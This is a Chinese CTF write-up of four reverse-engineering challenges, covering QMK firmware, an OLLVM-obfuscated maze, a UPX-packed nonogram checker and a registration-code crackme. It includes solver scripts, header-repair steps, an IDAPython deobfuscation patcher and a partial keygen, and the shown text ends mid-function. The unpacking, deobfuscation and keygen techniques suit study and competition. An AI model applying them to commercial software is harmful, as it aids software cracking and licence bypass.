# 【WP】2022年春秋杯春季赛Reverse、Pwn类题目解析

> 原文: https://www.ctfiot.com/52005.html
> ID: 52005

babyqmk

搜索字符串发现qmk_firmware，搜索得知是一个开源键盘固件。

搜索字符串，找到输出Combo 1!的位置。查看qmk手册得知Combo激活时会回调process_combo_event函数。

Combo的按键信息存放在key_combos中，找到key_combos结构体的位置，根据keycode得到对应的按键，得知输入CHUNQIU会激活Combo_1，输入GAME会激活Combo_2。

通过process_combo_event函数得知，不同Combo激活会激活不同Layer。Layer信息存放在keymaps中，提取每个Layer的数据并格式化。观察得知共有3个Layer，每个Layer只有0-9A-Z按键的keycode不同，且Layer2中0-9位置上的按键继承了上一层Layer的keycode。

找到输出OK!的位置。查看qmk手册得知qmk会在按键按下或抬起时回调process_record_user。这个函数会根据当前的Layer对keycode进行不同的变换，然后根据变换后的值按下KeyTable中对应的按键。

根据输出的结果求出变换前的keycode，然后根据不同的Layer将keycode映射回原来的按键就可以得到flag。

SEED = 0
KC_A = 4
KC_Z = 29
KC_1 = 30
KC_9 = 38
KC_0 = 39

def rand():
 global SEED
 SEED = 214013 * SEED + 2531011
 return (SEED >> 16) & 0x7fff

keycodeToKey = {0:'KC_NO', 1:'KC_TRANSPARENT', 2:'KC_POST_FAIL', 3:'KC_UNDEFINED', 4:'KC_A', 5:'KC_B', 6:'KC_C', 7:'KC_D', 8:'KC_E', 9:'KC_F', 10:'KC_G', 11:'KC_H', 12:'KC_I', 13:'KC_J', 14:'KC_K', 15:'KC_L', 16:'KC_M', 17:'KC_N', 18:'KC_O', 19:'KC_P', 20:'KC_Q', 21:'KC_R', 22:'KC_S', 23:'KC_T', 24:'KC_U', 25:'KC_V', 26:'KC_W', 27:'KC_X', 28:'KC_Y', 29:'KC_Z', 30:'KC_1', 31:'KC_2', 32:'KC_3', 33:'KC_4', 34:'KC_5', 35:'KC_6', 36:'KC_7', 37:'KC_8', 38:'KC_9', 39:'KC_0', 40:'KC_ENTER', 41:'KC_ESCAPE', 42:'KC_BACKSPACE', 43:'KC_TAB', 44:'KC_SPACE', 45:'KC_MINUS', 46:'KC_EQUAL', 47:'KC_LEFT_BRACKET', 48:'KC_RIGHT_BRACKET', 49:'KC_BACKSLASH', 50:'KC_NONUS_HASH', 51:'KC_SEMICOLON', 52:'KC_QUOTE', 53:'KC_GRAVE', 54:'KC_COMMA', 55:'KC_DOT', 56:'KC_SLASH', 57:'KC_CAPS_LOCK', 58:'KC_F1', 59:'KC_F2', 60:'KC_F3', 61:'KC_F4', 62:'KC_F5', 63:'KC_F6', 64:'KC_F7', 65:'KC_F8', 66:'KC_F9', 67:'KC_F10', 68:'KC_F11', 69:'KC_F12', 70:'KC_PRINT_SCREEN', 71:'KC_SCROLL_LOCK', 72:'KC_PAUSE', 73:'KC_INSERT', 74:'KC_HOME', 75:'KC_PAGE_UP', 76:'KC_DELETE', 77:'KC_END', 78:'KC_PAGE_DOWN', 79:'KC_RIGHT', 80:'KC_LEFT', 81:'KC_DOWN', 82:'KC_UP', 83:'KC_NUM_LOCK', 84:'KC_KP_SLASH', 85:'KC_KP_ASTERISK', 86:'KC_KP_MINUS', 87:'KC_KP_PLUS', 88:'KC_KP_ENTER', 89:'KC_KP_1', 90:'KC_KP_2', 91:'KC_KP_3', 92:'KC_KP_4', 93:'KC_KP_5', 94:'KC_KP_6', 95:'KC_KP_7', 96:'KC_KP_8', 97:'KC_KP_9', 98:'KC_KP_0', 99:'KC_KP_DOT', 100:'KC_NONUS_BACKSLASH', 101:'KC_APPLICATION', 102:'KC_KB_POWER', 103:'KC_KP_EQUAL', 104:'KC_F13', 105:'KC_F14', 106:'KC_F15', 107:'KC_F16', 108:'KC_F17', 109:'KC_F18', 110:'KC_F19', 111:'KC_F20', 112:'KC_F21', 113:'KC_F22', 114:'KC_F23', 115:'KC_F24', 116:'KC_EXECUTE', 117:'KC_HELP', 118:'KC_MENU', 119:'KC_SELECT', 120:'KC_STOP', 121:'KC_AGAIN', 122:'KC_UNDO', 123:'KC_CUT', 124:'KC_COPY', 125:'KC_PASTE', 126:'KC_FIND', 127:'KC_KB_MUTE', 128:'KC_KB_VOLUME_UP', 129:'KC_KB_VOLUME_DOWN', 130:'KC_LOCKING_CAPS_LOCK', 131:'KC_LOCKING_NUM_LOCK', 132:'KC_LOCKING_SCROLL_LOCK', 133:'KC_KP_COMMA', 134:'KC_KP_EQUAL_AS400', 135:'KC_INTERNATIONAL_1', 136:'KC_INTERNATIONAL_2', 137:'KC_INTERNATIONAL_3', 138:'KC_INTERNATIONAL_4', 139:'KC_INTERNATIONAL_5', 140:'KC_INTERNATIONAL_6', 141:'KC_INTERNATIONAL_7', 142:'KC_INTERNATIONAL_8', 143:'KC_INTERNATIONAL_9', 144:'KC_LANGUAGE_1', 145:'KC_LANGUAGE_2', 146:'KC_LANGUAGE_3', 147:'KC_LANGUAGE_4', 148:'KC_LANGUAGE_5', 149:'KC_LANGUAGE_6', 150:'KC_LANGUAGE_7', 151:'KC_LANGUAGE_8', 152:'KC_LANGUAGE_9', 153:'KC_ALTERNATE_ERASE', 154:'KC_SYSTEM_REQUEST', 155:'KC_CANCEL', 156:'KC_CLEAR', 157:'KC_PRIOR', 158:'KC_RETURN', 159:'KC_SEPARATOR', 160:'KC_OUT', 161:'KC_OPER', 162:'KC_CLEAR_AGAIN', 163:'KC_CRSEL', 164:'KC_EXSEL', 224:'KC_LEFT_CTRL', 225:'KC_LEFT_SHIFT', 226:'KC_LEFT_ALT', 227:'KC_LEFT_GUI', 228:'KC_RIGHT_CTRL', 229:'KC_RIGHT_SHIFT', 230:'KC_RIGHT_ALT', 231:'KC_RIGHT_GUI'}

keymaps = [0x0029, 0x0000, 0x003A, 0x003B, 0x003C, 0x003D, 0x0000, 0x003E, 
    0x003F, 0x0040, 0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046, 
    0x0047, 0x0048, 0x0035, 0x001E, 0x001F, 0x0020, 0x0021, 0x0022, 
    0x0023, 0x0024, 0x0025, 0x0026, 0x0027, 0x002D, 0x002E, 0x002A, 
    0x0000, 0x0049, 0x004A, 0x004B, 0x002B, 0x0000, 0x0014, 0x001A, 
    0x0008, 0x0015, 0x0017, 0x001C, 0x0018, 0x000C, 0x0012, 0x0013, 
    0x002F, 0x0030, 0x0031, 0x004C, 0x004D, 0x004E, 0x0039, 0x0000, 
    0x0004, 0x0016, 0x0007, 0x0009, 0x000A, 0x000B, 0x000D, 0x000E, 
    0x000F, 0x0033, 0x0034, 0x0028, 0x0000, 0x0000, 0x0000, 0x0000, 
    0x0000, 0x00E1, 0x001D, 0x001B, 0x0006, 0x0019, 0x0005, 0x0011, 
    0x0010, 0x0036, 0x0037, 0x0038, 0x0000, 0x00E5, 0x0000, 0x0000, 
    0x0052, 0x0000, 0x00E0, 0x00E3, 0x0000, 0x00E2, 0x0000, 0x0000, 
    0x002C, 0x0000, 0x0000, 0x0000, 0x00E6, 0x00E7, 0x0000, 0x0065, 
    0x00E4, 0x0050, 0x0051, 0x004F, 0x0029, 0x0000, 0x003A, 0x003B, 
    0x003C, 0x003D, 0x0000, 0x003E, 0x003F, 0x0040, 0x0041, 0x0042, 
    0x0043, 0x0044, 0x0045, 0x0046, 0x0047, 0x0048, 0x0035, 0x0012, 
    0x0013, 0x000D, 0x0020, 0x001B, 0x0016, 0x000E, 0x0005, 0x0011, 
    0x001A, 0x002D, 0x002E, 0x002A, 0x0000, 0x0049, 0x004A, 0x004B, 
    0x002B, 0x0000, 0x0015, 0x000A, 0x0027, 0x0022, 0x0009, 0x0018, 
    0x0024, 0x0023, 0x0017, 0x0006, 0x002F, 0x0030, 0x0031, 0x004C, 
    0x004D, 0x004E, 0x0039, 0x0000, 0x0007, 0x0004, 0x0010, 0x000C, 
    0x0019, 0x0008, 0x001C, 0x0014, 0x000F, 0x0033, 0x0034, 0x0028, 
    0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x00E1, 0x001F, 0x000B, 
    0x001E, 0x0025, 0x001D, 0x0026, 0x0021, 0x0036, 0x0037, 0x0038, 
    0x0000, 0x00E5, 0x0000, 0x0000, 0x0052, 0x0000, 0x00E0, 0x00E3, 
    0x0000, 0x00E2, 0x0000, 0x0000, 0x002C, 0x0000, 0x0000, 0x0000, 
    0x00E6, 0x00E7, 0x0000, 0x0065, 0x00E4, 0x0050, 0x0051, 0x004F, 
    0x0029, 0x0000, 0x003A, 0x003B, 0x003C, 0x003D, 0x0000, 0x003E, 
    0x003F, 0x0040, 0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046, 
    0x0047, 0x0048, 0x0035, 0x0001, 0x0001, 0x0001, 0x0001, 0x0001, 
    0x0001, 0x0001, 0x0001, 0x0001, 0x0001, 0x002D, 0x002E, 0x002A, 
    0x0000, 0x0049, 0x004A, 0x004B, 0x002B, 0x0000, 0x0025, 0x0004, 
    0x0023, 0x0015, 0x0008, 0x001D, 0x0019, 0x001F, 0x0006, 0x0027, 
    0x002F, 0x0030, 0x0031, 0x004C, 0x004D, 0x004E, 0x0039, 0x0000, 
    0x0010, 0x0007, 0x000F, 0x0009, 0x0021, 0x0022, 0x001E, 0x0026, 
    0x000B, 0x0033, 0x0034, 0x0028, 0x0000, 0x0000, 0x0000, 0x0000, 
    0x0000, 0x00E1, 0x0018, 0x001C, 0x0024, 0x0014, 0x0017, 0x000C, 
    0x000A, 0x0036, 0x0037, 0x0038, 0x0000, 0x00E5, 0x0000, 0x0000, 
    0x0052, 0x0000, 0x00E0, 0x00E3, 0x0000, 0x00E2, 0x0000, 0x0000, 
    0x002C, 0x0000, 0x0000, 0x0000, 0x00E6, 0x00E7, 0x0000, 0x0065, 
    0x00E4, 0x0050, 0x0051, 0x004F]

LayerMap = [dict(), dict(), dict()]

def buildLayerMap(layer):
 for i in range(108):
  curr_keycode = keymaps[layer * 108 + i]
  if curr_keycode == 1: # KC_TRANSPARENT
   curr_keycode = keymaps[(layer - 1) * 108 + i]
  LayerMap[layer][ keycodeToKey[ curr_keycode ] ] = keycodeToKey[ keymaps[i] ]

def formatLayer():
    for layer in range(0, 3):
        for col in range(6):
            for row in range(18):
                print(keycodeToKey[ keymaps[layer * 108 + col * 18 + row] ].ljust(15),end=',')
            print()
        print()
        
formatLayer()
buildLayerMap(1)
buildLayerMap(2)
SEED = rand()
sum = 0
enc = "1CTED8IL-BIMM-SMFP-HOKP-HOIDRZL4W6KR"
Table = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
flag = ""

for i in range(36):
 rand()
 Layer_stat = (i // 18) + 1
 if enc[i] in Table:
  if Layer_stat == 1:
   keycode = Table.index(enc[i]) - (rand() % 36)
   if keycode < KC_A:
    keycode += 36
   sum += keycode
  else:
   keycode = Table.index(enc[i]) + (sum % 40)
   if keycode > KC_0:
    keycode -= 36
   sum += keycode
  flag += LayerMap[ Layer_stat ][ keycodeToKey[keycode] ][3:]
 else:
  flag += enc[i]

print("flag{" + flag + "}")

ezam

检查无壳，IDA打开，发现明显的流程平坦化混淆。

-fla反混淆：使用llvm混淆处理工具(https://github.com/cq674350529/deflat)进行处理，得到去平坦化后的文件ezam_recovered。因为deflat只能处理一个指定地址的函数，所以在sub_400670也有 -fla混淆的情况下，需要分别处理两遍。

python3 deflat.py -f ./ezam --addr 0x4008F0
python3 deflat.py -f ./ezam_recovered --addr 0x400670

最后得到ezam_recovered_recovered

处理完后可以看到逻辑较原题目文件更为清晰，摘录IDA反编译后的main函数：

__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned __int8 ii; // [rsp+197h] [rbp-2A9h]
  __int16 v5; // [rsp+198h] [rbp-2A8h]
  unsigned __int8 n; // [rsp+19Ah] [rbp-2A6h]
  char m; // [rsp+19Bh] [rbp-2A5h]
  int v8; // [rsp+19Ch] [rbp-2A4h]
  unsigned __int8 l; // [rsp+1A2h] [rbp-29Eh]
  unsigned __int8 k; // [rsp+1A3h] [rbp-29Dh]
  unsigned int v11; // [rsp+1A4h] [rbp-29Ch]
  unsigned int v12; // [rsp+1A8h] [rbp-298h]
  unsigned int v13; // [rsp+1ACh] [rbp-294h]
  unsigned __int8 j; // [rsp+1B2h] [rbp-28Eh]
  unsigned __int8 i; // [rsp+1B3h] [rbp-28Dh]
  int v16; // [rsp+1B4h] [rbp-28Ch]
  __int64 v17[2]; // [rsp+1C0h] [rbp-280h] BYREF
  int v18[12]; // [rsp+1D0h] [rbp-270h] BYREF
  int v19[12]; // [rsp+200h] [rbp-240h] BYREF
  char v20[384]; // [rsp+230h] [rbp-210h] BYREF
  char v21[48]; // [rsp+3B0h] [rbp-90h] BYREF
  char v22[32]; // [rsp+3E0h] [rbp-60h] BYREF
  char s[40]; // [rsp+400h] [rbp-40h] BYREF
  int v24; // [rsp+428h] [rbp-18h]
  int v25; // [rsp+42Ch] [rbp-14h]

  v24 = 0;
  memset(s, 0, 0x22uLL);
  memset(v22, 0, 0x1BuLL);
  memset(v21, 0, 0x2DuLL);
  printf("Give me a flag, and I will give you a flag if it is a flag.n");
  __isoc99_scanf("%33s", s);
  memset(v20, 0, sizeof(v20));
  memcpy(v19, &unk_401C50, sizeof(v19));
  memcpy(v18, &unk_401C80, sizeof(v18));
  qmemcpy(v17, "#39C5BB_i5_b3st!", sizeof(v17));
  v16 = 0;
  for ( i = 0; i < 0xCu; ++i )
    v16 = ~v18[i] & v16 | ~v16 & v18[i];
  for ( j = 0; j < 0xCu; j += 2 )
  {
    v13 = v19[j];
    v12 = v19[j + 1];
    v11 = 32 * v16;
    for ( k = 0; k < 0x20u; ++k )
    {
      v12 -= ~(*((_DWORD *)v17 + ~(~(v11 >> 11) | 0xFFFFFFFC)) + v11) & ((~(v13 >> 5) & (16 * v13) | ~(16 * v13) & (v13 >> 5))
                                                                       + v13) | ~((~(v13 >> 5) & (16 * v13) | ~(16 * v13) & (v13 >> 5))
                                                                                + v13) & (*((_DWORD *)v17
                                                                                          + ~(~(v11 >> 11) | 0xFFFFFFFC))
                                                                                        + v11);
      v11 -= v16;
      v13 -= ((*((_DWORD *)v17 + ~(~v11 | 0xFFFFFFFC)) + v11) & 0x567848F6 | ~(*((_DWORD *)v17 + ~(~v11 | 0xFFFFFFFC))
                                                                             + v11) & 0xA987B709) ^ (((~(v12 >> 5) & (16 * v12) | ~(16 * v12) & (v12 >> 5)) + v12) & 0x567848F6 | ~((~(v12 >> 5) & (16 * v12) | ~(16 * v12) & (v12 >> 5)) + v12) & 0xA987B709);
    }
    v19[j] = v13;
    v19[j + 1] = v12;
  }
  for ( l = 0; l < 0xCu; ++l )
  {
    v8 = v19[l];
    for ( m = 31; m >= 0; --m )
      v20[31 - -32 * l - m] = ~(~(1 << m) | (unsigned int)~v8) >> m;
  }
  if ( !memcmp(s, "flag{", 5uLL) && s[32] == 125 )
  {
    for ( n = 5; n < 0x20u; ++n )
    {
      if ( s[n] >= 58 || s[n] <= 47 )
        goto LABEL_43;
      v22[n - 5] = s[n] - 48;
    }
    sub_400670(v22, v21, 4LL, 2543397061LL);
    v5 = 0;
    for ( ii = 0; ii < 0x2Du; ++ii )
    {
      v25 = (unsigned __int8)v21[ii];
      if ( v25 < 2 )
      {
        if ( v25 >= 1 )
          --v5;
        else
          v5 -= 100;
      }
      else if ( v25 < 3 )
      {
        v5 += 100;
      }
      else if ( v25 == 3 )
      {
        ++v5;
      }
      if ( v5 == 823 )
      {
        printf("W0W, your flag is what your input!n");
        return 0;
      }
      if ( v5 < 0 || v5 % 100 > 23 || v5 / 100 > 15 || !v20[v5 % 100 - -24 * (v5 / 100)] )
        break;
    }
  }
LABEL_43:
  printf("Err0rn");
  return 1;
}

sub_400670逻辑：

__int64 __fastcall sub_400670(__int64 a1, __int64 a2, unsigned __int8 a3)
{
  __int64 result; // rax
  unsigned __int8 i; // [rsp+36h] [rbp-16h]
  char v6; // [rsp+37h] [rbp-15h]
  char v7; // [rsp+38h] [rbp-14h]
  unsigned __int8 v8; // [rsp+38h] [rbp-14h]
  unsigned __int8 v9; // [rsp+39h] [rbp-13h]
  unsigned __int8 v10; // [rsp+3Ah] [rbp-12h]

  v10 = 45;
  v9 = 0;
  while ( 1 )
  {
    result = 2650420955LL;
    if ( !v10-- )
      break;
    v7 = 0;
    v6 = 0;
    for ( i = v9; i < 0x1Bu; ++i )
    {
      v8 = *(_BYTE *)(a1 + i) - -10 * v7;
      *(_BYTE *)(a1 + i) = v8 / (__int16)a3;
      v7 = v8 % (__int16)a3;
      if ( !v6 )
      {
        if ( *(_BYTE *)(a1 + i) )
        {
          v9 = i;
          v6 = 1;
        }
      }
    }
    *(_BYTE *)(a2 + v10) = v7;
  }
  return result;
}

-sub反混淆：可以看到一些运算被混淆替换了，可以手动调整，也可以直接大致看代码逻辑。

~a & b | ~b & a  // == a ^ b
~(~a | ~b)       // == a & b
//....

整理逻辑可以知道：

line 37-38: 生成v16
line 39-57: XTEA解密
line 58-63: 把XTEA解密后的每个数据（32bits）按照大端二进制（4*8个）填入map中
line 66-72: 处理输入数据，从ASCII码转换到对应数字，再通过sub_400670进行十进制到四进制的转换（大整数的进制转换，使用数组模拟）
line 73-99: 走16*24迷宫，判断（v5代表在迷宫中的位置，以十进制xxyy表示）：有无出界、当前位置是否可走（1可走，0不可走），到终点（823，即map[8][23]）则判断正确；0代表上，1代表左，2代表下，3代表右

根据逻辑编写脚本exp.py，动态调试（或者按照一样的逻辑）拿到map，再构造特定的v21完成迷宫，最后将v21还原成输入拿到flag。

动态调试拿到map：

打印迷宫：

mymap = [1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]
for i in range(16):
    strmap = ""
    for j in range(24):
        if mymap[i*24+j] == 1:
            strmap += '.'
        else:
            strmap += '*'
    print(strmap)

走出路径：232222322330030000303322223333333222233333333

转成十进制：

得到flag

NONO

ExeinfoPE检查，有upx壳，但使用多版本的upx均无法脱壳，报错NotPackedException: not packed by UPX。

搜索报错可发现是特征值UPX!被抹去导致的（packers – Decoding the UPX ELF header file – Reverse Engineering Stack Exchange(https://reverseengineering.stackexchange.com/questions/3335/decoding-the-upx-elf-header-file)）。

查看UPX壳源码可知（也可以自己打包几个elf看看），unpack时会依次在三个地方检查UPX_MAGIC_LE32（即"UPX!"）：

① 在倒数第36字节偏移处检查，如果特征值不符就会转入throwNotPacked()异常抛出函数，打印not packed by UPX；

② l_info在Program Header后面，由readelf可以看到应该在第

字节偏移处开始。

而l_info的结构如下：

    __packed_struct(l_info)     // 12-byte trailer in header for loader
        TE32 l_checksum;
        LE32 l_magic;
        TE16 l_lsize;
        unsigned char l_version;
        unsigned char l_format;
    __packed_struct_end()

显然UPX!应该在l_info的第4字节偏移处，即整个文件的

字节偏移处。如果这里的特征值不符就会转入throwCantUnpack()异常抛出函数，打印l_info corrupted；

③ 在倒数第46字节偏移处检查，如果特征值不符就会转入throwCompressedDataViolation()异常抛出函数，打印Exception: compressed data violation；

按照偏移将①修改回UPX!，再次解包可以看到解包进入了后续的判错：

将②修改回UPX!，再次解包可以看到继续进入了后续的判错：

将③修改回UPX!，成功解包：

用IDA打开，可以看到一些永真/永假的分支，猜测是用了obfuscator-llvm/obfuscator(https://github.com/obfuscator-llvm/obfuscator)的-bcf选项混淆（可能有一点靠经验，但做题多的应该能知道）；试了很多angr框架的混淆处理工具都没办法处理（符号执行脱离不了死循环，等有空的时候再深入研究下x）。

因为这里直接用的是原版的ollvm混淆器，没有进行魔改，所以可以按照 利用angr符号执行去除虚假控制流(https://bbs.pediy.com/thread-266005.htm)里的方法，直接简单粗暴地将mov reg, global_varpatch成mov reg, 0即可。

（因为这里是x86_64的文件，所以原文中的do_patch函数需要自行修改，核心思想就是将mov reg, global_varpatch成mov reg, 0，同时用大部分逆向手都有的装keypatch时装的keystone来增强可移植性）

本题idapython脚本：

from keystone import *

# 文件架构
ks = Ks(KS_ARCH_X86, KS_MODE_64)

# 用于混淆的全局变量地址始末
start = 0x604064
end = 0x604090

def my_patch(ea):
  new_asm = (GetDisasm(ea).split(',')[0] + ', 0').encode()
  patchbytes, count = ks.asm(new_asm)
  patchbytes = bytes(patchbytes)
  if len(patchbytes) < get_item_size(ea):
      nop_len = get_item_size(ea) - len(patchbytes)
      ida_bytes.patch_bytes(ea, patchbytes + b'x90'*nop_len)
      print(new_asm, patchbytes)
  else:
      print("[-]REEOR: more bytes in new ins at 0x" + hex(ea))

for addr in range(start, end+1, 4):
  print(hex(addr).center(20,'-'))
  ref = ida_xref.get_first_dref_to(addr)
  # 获取所有交叉引用
  while(ref != ida_idaapi.BADADDR):
      my_patch(ref)
      ref = ida_xref.get_next_dref_to(addr, ref)

再用F5反编译即可看到较为清晰的代码。

可以看到程序逻辑是输入s1->从s1中提取出s->转化成v24->转化成v27->check(v27, 0) && check(v27, 1)

sub_400D20()是一个base64 decode操作，有换表，而且取表的时候取的是unk_402FF0[index-43]。

sub_400710()是判断字符范围，'a'<=*v8<='z' || 'A'<=*v8<='Z' || *v8=='+' || *v8=='' || *v8=='='。

sub_401670()进行了一个拓展（可以动态调试猜测），用已知数组a1拓展成由’0’和’1’组成的a2（因为patch有些取巧，所以反编译代码有问题，只能凑合着看）；其中a1的各元素代表’0’或’1’字符的长度。

sub_401E20()是一个数织(https://cn.puzzle-nonograms.com/)玩法的check，sub_401E20(v27, 0LL)和sub_401E20(v27, 1LL)分别用v27检测行/列连续方块的个数，以21切分各行/列，字符’1’是须填的答案，’0’为不填的，常量数组unk_403040相当于数织的规则，对应于以下题面（背景为蓝色）：

填出来以后就是（答案块/字符’1’须在的位置为白色）：

至此根据思路还原flag，填出数织谜面 -> 用0/1表示 -> 按照连续长度进行压缩 -> base64换表encode -> 用flag{}包裹，即可获得flag。

exp：

import base64
import re

# 填出来的数织答案
v27 = "0000000000000000000000000000000010000000000000000001110000000000000000111110000000000000111111110000000000011111111100000000001111111111100000000000111111100000000000000000000000000111111111111110000011100000000011110000111000000000111111100111111111111111000000000000000000000000000000111111100000000000001111111000000000000111111110000000000001111111000000000000000000000000000000000000000000000000"

# 按照0或1的连续长度进行压缩
tmpl = re.findall(r'0+|1+', v27)
v24 = bytes([len(x) for x in tmpl])

# 拿到base64的新表
unk_403040 = [0x0C, 0xFF, 0xFF, 0xFF, 0x22, 0x2C, 0x25, 0x05, 0x1E, 0x1F, 0x34, 0x1D, 0x39, 0x30, 0x15, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x2B, 0x14, 0x2D, 0x00, 0x10, 0x02, 0x11, 0x03, 0x37, 0x29, 0x33, 0x3B, 0x2E, 0x24, 0x2F, 0x20, 0x0A, 0x3D, 0x3F, 0x07, 0x08, 0x17, 0x0D, 0x28, 0x27, 0x26, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x35, 0x2A, 0x3A, 0x13, 0x18, 0x3E, 0x31, 0x38, 0x21, 0x01, 0x12, 0x0B, 0x32, 0x04, 0x06, 0x19, 0x09, 0x3C, 0x1B, 0x0E, 0x1C, 0x36, 0x0F, 0x16, 0x1A, 0x23]
mytable = [0 for _ in range(64)]
for x in unk_403040:
    if x != 0xFF:
        mytable[x] = chr(unk_403040.index(x)+43)
mytable = ''.join(mytable)
# 换表encode
b64table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
s = base64.b64encode(v24)
flag = "flag{" + s.decode().translate(str.maketrans(b64table, mytable)) + "}"
print(flag)

得到flag

RetroRegister

下断GetDlgItemTextA （获取文本框里的字符串），找到算法1

用户名按照题目描述输入chunqiucup，判断注册码的长度是否为29，判断是否为XXXXX-XXXXX-XXXXX-XXXXX-XXXXX 的格式，输入的字符串在23456789ABCDEFGHJKLMNPQRSTUVWXYZ范围内，转换成数字，范围在2**25内

注1：

IDA里看不到字符串，字符串是在程序通过LoadStringA函数加载，可通过程序执行完后查找字符串

对输入进行校验，各种xor操作，其中value值前4项任意，第5项为校验值

value = [0,0,0,0,0]
def hash():
    t = 0
    t &= 0x1f
    t ^= (value[0] & 0x1f00000) >> (4 * 5)
    t ^= (value[0] & 0xf8000) >> (3 * 5)
    t ^= (value[0] & 0x7c00) >> (2 * 5)
    t ^= (value[0] & 0x3e0) >> (1 * 5)
    t ^= (value[0] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (4 * 5) 
    t = 0
    t &= 0x1f
    t ^= (value[1] & 0x1f00000) >> (4 * 5)
    t ^= (value[1] & 0xf8000) >> (3 * 5)
    t ^= (value[1] & 0x7c00) >> (2 * 5)
    t ^= (value[1] & 0x3e0) >> (1 * 5)
    t ^= (value[1] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (3 * 5) 
    t = 0
    t &= 0x1f
    t ^= (value[2] & 0x1f00000) >> (4 * 5)
    t ^= (value[2] & 0xf8000) >> (3 * 5)
    t ^= (value[2] & 0x7c00) >> (2 * 5)
    t ^= (value[2] & 0x3e0) >> (1 * 5)
    t ^= (value[2] & 0x1f) >> (0 * 5)

    #t ^= (value[2] & 0xf8000) >> (2 * 5)
    print(t)
    value[4] |= t << (2 * 5) 
    t = 0

    t &= 0x1f
    t ^= (value[3] & 0x1f00000) >> (4 * 5)
    t ^= (value[3] & 0xf8000) >> (3 * 5)
    t ^= (value[3] & 0x7c00) >> (2 * 5)
    t ^= (value[3] & 0x3e0) >> (1 * 5)
    t ^= (value[3] & 0x1f) >> (0 * 5)

    #t ^= (value[1] & 0xf8000) >> (1 * 5)
    print(t)
    value[4] |= t << (1 * 5)
    t = 0
    for i in range(4):
        t ^= (value[i] & 0x1f00000) >> (4 * 5)
        t ^= (value[i] & 0xf8000) >> (3 * 5)
        t ^= (value[i] & 0x7c00) >> (2 * 5)
        t ^= (value[i] & 0x3e0) >> (1 * 5)
        t ^= (value[i] & 0x1f) >> (0 * 5)
    value[4] |= t << (0 * 5)

程序提示需要重启验证，同时发现程序创建了reg.dat,下断CreateFileA(打开文件)，重新调试程序，ReadFile读取文件内容加载到内存

读取的内容存放到405018，发现有 用户名，注册码的数值，还有一些其他数据

对注册码数值下硬件断点，可以找到几处逻辑

第1个数值 xor两个数比较结果

第2个数值 xor后解一个方程组，方程组结果固定10,23,8,10,17

第3 4个数值

解一个变种tea

4个数值的计算用到了参数([40503c]开始的4个参数),参数在读取reg.dat后经过计算确定

如果用软件断点调试的话会发现几次数据不一致，程序里加了自校验代码，sm3 hash也参与了参数计算，此时删除所有程序内的软件断点,在这里设置硬件断点即可得到真实数据

hash_value=[0x963541E5, 0x80C0F758, 0x0C30C975, 0x9F6D867D]
value = [0 for i in range(5)]
ch = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"
# L5FQH-8QPJB-X95NE-SXKFQ-7W3HR
# chunqiucup
# 
def trans(v):
    for i in range(5):
        t = (v >> ((4-i)*5)) & 31
        print(ch[t],end="")

def tea_encrypt(v, k):
    v0 = v[0] & 0x1ffffff
    v1 = v[1] & 0x1ffffff
    x = 0
    delta = 0x13c6a7e
    k0 = (hash_value[0] & 0xfe000000) >> 25 | (hash_value[2] & 0xfe000000) >> (25 - 7)
    k1 = (hash_value[1] & 0xfe000000) >> 25 | (hash_value[3] & 0xfe000000) >> (25 - 7)
    k2 = (hash_value[2] & 0x1ffffff)
    k3 = (hash_value[3] & 0x1ffffff)
    for i in range(32):
        x += delta
        x = x & 0x1ffffff
        v0 += ((v1 << 4) + k0) ^ (v1 + x) ^ ((v1 >> 5) + k1)
        v0 = v0 & 0x1ffffff
